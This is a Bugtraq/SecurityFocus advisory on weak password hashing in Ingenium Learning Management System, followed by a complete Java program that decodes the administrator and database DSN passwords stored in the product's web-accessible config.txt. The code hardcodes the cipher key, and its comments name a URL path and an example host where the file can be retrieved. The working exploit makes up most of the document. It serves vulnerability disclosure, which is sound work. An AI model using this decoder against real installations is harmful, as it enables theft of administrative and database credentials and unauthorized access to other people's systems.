source: http://www.securityfocus.com/bid/5970/info

Ingenium Learning Management System uses a weak algorithm to hash user and administrative credentials. Passwords may be trivially obtained by reversing the password hash.

An attacker must be able to gain unauthorized access to the password hashes for this issue to be exploited. This may be achieved by taking advantage of the issue described in Bugtraq ID 5969. Hashed user credentials will also be stored in the database, and may potentially be retrieved by an attacker with the ability to construct or influence SQL queries.

import javax.swing.JOptionPane;

/**
 * IngeniumDecoder
 * Simple program to decode the admin password hash present in the Ingenium
 * LMS config.txt file.  This file is stored within the htdocs directory
 * tree, so is available through a simple URL.  For instance, if your
 * Ingenium install is in http://suffolk.click2learn.com/suffolk_test/, then
 * the config file is located at 
 * http://suffolk.click2learn.com/suffolk_test/config/config.txt.  The same
 * password hashing scheme is used both for the "administrator" login account
 * and the SQL database DSN password.
 *
 * @author  Brian Enigma <enigma@netninja.com>
 */
public class IngeniumDecoder {
    /** The low end of the keyspace */
    public static int WRAP_BOTTOM = 0x20; // space
    /** The high end of the keyspace */
    public static int WRAP_TOP    = 0x7E; // close curley brace
    public static int CHAR_ZERO   = 0x6E;
    /** The symmetric key */
    public static String KEY      = "9'$%100'%6";
    
    /** 
     * Given some cyphertext, produce the plaintext.  The encryption method
     * employed is a simple Caesar cypher with a key that rotates depending
     * on the position of the character in the plaintext/cyphertext.  The
     * offset is determined by the KEY string above.  (This is similar to
     * obfuscation using ROT-13 coding, only the "13" changes by position.)
     *
     *@param s the cyphertext
     *@return the plaintext
     */
    public static String decode(String s) {
        StringBuffer result = new StringBuffer();
        int max = s.length();
        for (int i=0; i<max; i++) {
            int cypherLetter = (int) s.charAt(i);
            int keyLetter = (int) KEY.charAt(i % KEY.length());
            if (cypherLetter == keyLetter)
                continue;
            int decodeLetter = cypherLetter - keyLetter;
            if (decodeLetter < WRAP_BOTTOM)
                decodeLetter = WRAP_TOP - (WRAP_BOTTOM - decodeLetter);
            if ((decodeLetter >= CHAR_ZERO) && (decodeLetter <= CHAR_ZERO+10))
                result.append(decodeLetter - CHAR_ZERO + Character.getNumericValue('0'));
            else if ((decodeLetter >= WRAP_BOTTOM) && (decodeLetter <= WRAP_TOP))
                result.append(Character.toString((char) decodeLetter));
            else
                result.append("[unknown letter]");
        }
        return result.toString();
    }
    
    /** Creates a new instance of IngeniumDecoder */
    private IngeniumDecoder() {
    }
    
    public static void main(String[] argv) {
        //System.out.println(decode("|smh|#'hp{9'$%10"));
        String hashedPass = JOptionPane.showInputDialog(
            null,
            "Please enter the \"hashed\" admin password from config.txt",
            "Enter hash",
            JOptionPane.QUESTION_MESSAGE);
        if ((hashedPass != null) && (hashedPass.length() > 0))
            JOptionPane.showMessageDialog(
                null, 
                "The decoded password is " + decode(hashedPass),
                "Plaintext",
                JOptionPane.INFORMATION_MESSAGE);
        System.exit(0);
    }
    
}
